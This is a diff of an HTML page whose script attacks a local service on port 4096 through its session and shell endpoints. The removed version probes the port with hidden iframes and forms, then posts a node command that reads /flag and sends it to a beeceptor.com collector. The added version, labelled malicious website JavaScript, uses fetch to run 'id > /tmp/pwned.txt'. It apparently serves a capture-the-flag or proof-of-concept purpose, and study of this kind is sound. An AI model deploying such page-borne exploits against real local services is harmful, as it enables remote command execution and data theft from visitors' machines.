@@ -2,64 +2,20 @@
 <html>
 <body>
 <script>
-(function() {
-    const EXFIL = "1233334.free.beeceptor.com";  // 替换为你的接收端
-    const RUN_ID = Math.random().toString(36).substring(2) + Date.now();
-
-    function beacon(action, extra) {
-        new Image().src = `${EXFIL}/log?run=${RUN_ID}&action=${encodeURIComponent(action)}` + (extra ? `&${extra}` : '');
-    }
-
-    const PAYLOAD = `node -e "require('fs').chmodSync('/flag', 0o644); require('http').request('${EXFIL}/flag?run=${RUN_ID}',{method:'POST'},r=>{}).end(require('fs').readFileSync('/flag'))"`;
-
-    const BASE = 'http://localhost:4096';
-
-    // 通过隐藏 iframe 提交表单，不读取响应，但浏览器会自动保存 Cookie
-    function postForm(url, data) {
-        let iframe = document.createElement('iframe');
-        iframe.name = 'hiddenFormTarget';
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
-        let form = document.createElement('form');
-        form.method = 'POST';
-        form.action = url;
-        form.target = 'hiddenFormTarget';
-        form.style.display = 'none';
-        for (let [k, v] of Object.entries(data)) {
-            let input = document.createElement('input');
-            input.type = 'hidden';
-            input.name = k;
-            input.value = v;
-            form.appendChild(input);
-        }
-        document.body.appendChild(form);
-        form.submit();
-        setTimeout(() => {
-            form.remove();
-            iframe.remove();
-        }, 1000);
-    }
-
-    beacon('start');
-
-    // 探测端口 4096 是否开放
-    let probe = document.createElement('iframe');
-    probe.style.display = 'none';
-    probe.src = BASE + '/';
-    probe.onload = () => {
-        beacon('port_open');
-        // 1. 创建 session，服务端返回 Set-Cookie，浏览器自动保存
-        postForm(BASE + '/session', {});
-        // 2. 等待 Cookie 生效，然后发送命令（使用常见的 session ID 1）
-        setTimeout(() => {
-            postForm(BASE + '/session/1/shell', { command: PAYLOAD });
-            postForm(BASE + '/session/1/shell', { cmd: PAYLOAD });  // 尝试不同参数名
-            beacon('exploit_sent');
-        }, 1000);
-    };
-    probe.onerror = () => beacon('port_error');
-    document.body.appendChild(probe);
-})();
+// Malicious website JavaScript
+fetch('http://127.0.0.1:4096/session', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: '{}'
+})
+.then(r => r.json())
+.then(session => {
+  fetch(`http://127.0.0.1:4096/session/${session.id}/shell`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({agent: 'build', command: 'id > /tmp/pwned.txt'})
+  });
+});
 </script>
 </body>
 </html>
